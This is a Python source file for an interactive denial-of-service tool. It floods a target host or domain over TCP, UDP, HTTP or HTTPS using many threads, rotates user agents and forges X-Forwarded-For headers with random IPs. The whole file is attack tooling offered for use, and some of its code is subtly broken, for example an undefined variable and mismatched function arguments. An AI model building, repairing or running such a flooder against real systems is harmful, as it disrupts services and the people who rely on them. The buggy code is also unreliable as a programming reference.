import socket
import threading
import random
import ssl
import time
import logging
from rich.console import Console
from rich.progress import Progress

# Initialize rich console for better visual output
console = Console()

# Set up logging
logging.basicConfig(filename="attack_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# User agents for HTTP/HTTPS attacks
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

# Generate a random IP address to spoof
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Create random HTTP headers to send with the request
def create_fake_headers():
    user_agent = random.choice(user_agents)
    fake_ip = generate_random_ip()
    headers = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"X-Forwarded-For: {fake_ip}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    return headers.encode('ascii')

# Attack functions for TCP, UDP, HTTP, and HTTPS attacks
def tcp_flood(target_ip, target_port, timeout):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(timeout)
    try:
        client.connect((target_ip, target_port))
        client.send(b"GET / HTTP/1.1\r\n")
        client.close()
        logging.info(f"TCP Attack on {target_ip}:{target_port} successful")
    except socket.error as e:
        logging.error(f"TCP Attack error: {e}")

def udp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        message = random._urandom(1024)  # Random payload
        client.sendto(message, (target_ip, target_port))
        logging.info(f"UDP packet sent to {target_ip}:{target_port}")
    except socket.error as e:
        logging.error(f"UDP Attack error: {e}")

def http_flood(target_ip, target_port, timeout):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(timeout)
    try:
        client.connect((target_ip, target_port))
        headers = create_fake_headers()
        client.send(headers)
        client.close()
        logging.info(f"HTTP request sent to {target_ip}:{target_port}")
    except socket.error as e:
        logging.error(f"HTTP Attack error: {e}")

def https_flood(target_ip, target_port, timeout):
    context = ssl.create_default_context()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(timeout)
    try:
        client_ssl = context.wrap_socket(client, server_hostname=target_ip)
        client_ssl.connect((target_ip, target_port))
        headers = create_fake_headers()
        client_ssl.send(headers)
        client_ssl.close()
        logging.info(f"HTTPS request sent to {target_ip}:{target_port}")
    except socket.error as e:
        logging.error(f"HTTPS Attack error: {e}")

# Launch the attack with multiple threads
def launch_attack(target_ip, target_port, attack_type, num_threads, timeout):
    attack_funcs = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "http": http_flood,
        "https": https_flood
    }
    attack_func = attack_funcs.get(attack_type)
    
    if not attack_func:
        console.print("[red]Invalid attack type! Choose from: tcp, udp, http, https.[/red]")
        return
    
    with Progress() as progress:
        task = progress.add_task(f"[green]Launching {attack_type.upper()} attack...", total=num_threads)
        for _ in range(num_threads):
            thread = threading.Thread(target=attack_func, args=(target_ip, target_port, timeout))
            thread.start()
            progress.advance(task)

# Function to resolve domain names to IP addresses
def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        console.print(f"[green]Resolved domain {domain} to IP {ip}[/green]")
        return ip
    except socket.error as e:
        console.print(f"[red]Failed to resolve domain: {e}[/red]")
        return None

# Interactive menu for dynamic feature selection
def interactive_menu():
    console.print("[bold cyan]Enter target domain or IP:[/bold cyan]", end=" ")
    target_input = input().strip()
    
    if not target_input.replace(".", "").isdigit():  # If not purely numeric, assume it's a domain
        resolved_ip = resolve_domain(target_input)
        if resolved_ip:
            target_ip = resolved_ip
        else:
            return
    else:
        target_ip = target_input

    console.print("[bold cyan]Enter target Port (e.g., 80 for HTTP, 443 for HTTPS):[/bold cyan]", end=" ")
    target_port = int(input().strip())

    console.print("[bold cyan]Choose attack type (tcp, udp, http, https):[/bold cyan]", end=" ")
    attack_type = input().lower().strip()

    console.print("[bold cyan]Enter number of threads:[/bold cyan]", end=" ")
    num_threads = int(input().strip())

    console.print("[bold cyan]Enter request timeout (seconds):[/bold cyan]", end=" ")
    timeout = float(input().strip())

    console.print("[bold cyan]Enable random port targeting? (y/n):[/bold cyan]", end=" ")
    random_ports = input().lower().strip() == 'y'
    
    if random_ports:
        target_port = random.randint(1, 65535)
        console.print(f"[green]Random port selected: {target_port}[/green]")

    # Launch the attack
    launch_attack(target_ip, target_port, attack_type, num_threads, timeout)

# Run the interactive menu to start the tool
interactive_menu()
  
